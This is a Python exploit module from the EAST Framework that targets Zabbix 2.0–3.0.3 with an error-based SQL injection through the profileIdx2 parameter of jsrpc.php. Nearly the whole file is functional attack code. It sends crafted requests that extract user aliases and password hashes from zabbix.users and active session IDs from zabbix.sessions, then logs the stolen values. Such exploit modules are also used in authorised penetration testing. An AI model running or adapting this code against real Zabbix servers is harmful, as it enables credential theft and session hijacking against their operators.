#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import re
import json
import urllib2

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_zabbix_sqli"
INFO['DESCRIPTION'] = "Zabbix 2.0 - 3.0.3 - SQL Injection"
INFO['VENDOR'] = "http://www.zabbix.com"
INFO['DOWNLOAD_LINK'] = 'http://www.zabbix.com/download.php'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40353/', 'http://seclists.org/fulldisclosure/2016/Aug/82']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Zabbix versions 2.0 through 3.0.3 remote SQL injection exploit. Tested on Linux
"""

INFO['CHANGELOG'] = "09 Sep, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '192.168.1.123', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target Port')
OPTIONS["BASEPATH"] = '/zabbix', dict(description = 'Basepath')




class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = 80
        self.basepath = ""
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = int(self.args.get('PORT', OPTIONS['PORT']))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def inject(self, sql, reg):
        payload = self.make_url("/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
        sql) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1")
        try:
            response = urllib2.urlopen(payload, timeout=20).read()
        except Exception, msg:
            self.log(msg)
        else:
            result_reg = re.compile(reg)
            results = result_reg.findall(response)
            if results:
                return results[0]
            
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        for userid in xrange(2):
            passwd_sql = "(select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT " + str(userid - 1) + ",1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
            
            session_sql = "(select 1 from (select count(*),concat((select(select concat(cast(concat(sessionid,0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid=" + str(userid) + " LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
            
            password = self.inject(passwd_sql, r"Duplicate\s*entry\s*'(.+?)~~")
            if password:
                self.log('[+]Username~Password : %s' % password)
            else:
                self.log('[-]Get Password Failed')
            
            session_id = self.inject(session_sql, r"Duplicate\s*entry\s*'(.+?)~")
            if session_id:
                self.log("[+]Session_id ： %s" % session_id)
            else:
                self.log("[-]Get Session id Failed")
        
        self.finish(True)
                
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
